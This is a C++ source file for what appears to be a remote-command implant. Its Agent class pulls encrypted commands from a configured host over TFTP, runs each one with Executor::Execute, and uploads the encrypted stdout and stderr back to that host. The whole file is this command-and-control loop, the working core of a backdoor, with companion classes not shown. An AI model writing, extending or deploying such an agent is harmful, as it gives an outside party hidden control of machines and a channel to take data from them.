#include "Agent.h"
#include "Packer.h"
#include "Transport/TFTPClient.h"

#include "easylogging++.h"
#include <format>


Agent::Agent(std::string host, std::string encryptionKey, uint16_t port)
    : m_tftpClient(std::make_unique<TFTPClient>(host, port))
    , m_host(std::move(host))
    , m_port(port)
    , m_encryptionKey(std::move(encryptionKey))
{
    if (m_encryptionKey.empty()) {
        LOG(WARNING) << "Encryption key is empty - packing/unpacking may not work correctly";
    }
}

Agent::Agent(ITFTPClient* client, std::string encryptionKey)
    : m_tftpClient(client, [](ITFTPClient*) {}) // empty deleter for tests
    , m_host("")
    , m_port(0)
    , m_encryptionKey(std::move(encryptionKey))
{
    if (!client) {
        throw std::invalid_argument("TFTP client cannot be null");
    }
    if (m_encryptionKey.empty()) {
        LOG(WARNING) << "Encryption key is empty - packing/unpacking may not work correctly";
    }
}

std::string Agent::GetCommand()
{
    std::vector<BYTE> command;
    ITFTPClient::Status status = m_tftpClient->Get(command, TFTPClient::GetDownloadedDefaultFName());
    
    if (status != ITFTPClient::Status::kSuccess) {
        LOG(ERROR) << "Error while getting command: " << TFTPClient::ErrorDescription(status);
        return "";
    }

    Packer packer(m_encryptionKey);
    std::vector<BYTE> unpacked = packer.Unpack(command);
    std::ostringstream oss;
    for (auto e : unpacked) {
        oss << e;
    }
    return oss.str();
}




bool Agent::SendResult(CommandResult result)
{
    Packer packer(m_encryptionKey);
    std::string plaintext_result = "stdout:\n" + result.std_out + "\nstderr:\n" + result.std_err;
    std::vector<BYTE> data(plaintext_result.begin(), plaintext_result.end());
    std::vector<BYTE> packed_data = packer.Pack(data);

    ITFTPClient::Status status = m_tftpClient->Put(packed_data, TFTPClient::GetUploadedUniqueFName());
    
    if (status != ITFTPClient::Status::kSuccess) {
        LOG(ERROR) << "Error while sending results: " << TFTPClient::ErrorDescription(status);
        return false;
    }
    return true;
}


void Agent::DoIteration()
{
    std::string command = GetCommand();
    if(command.empty())
    {
        LOG(ERROR) << "Command not found.";
        return;
    }
    // using default timeout
    CommandResult result = Executor::Execute(command);
    VLOG(1) << "result.exitStatus: " << Executor::ErrorDescription(result.exitCode);
    VLOG(1) << "result.stdout: " << result.std_out; 
    VLOG(1) << "result.stderr: " << result.std_err; 
    if(SendResult(result))
    {
        LOG(INFO) << "Result was successfuly sent.";
    }
}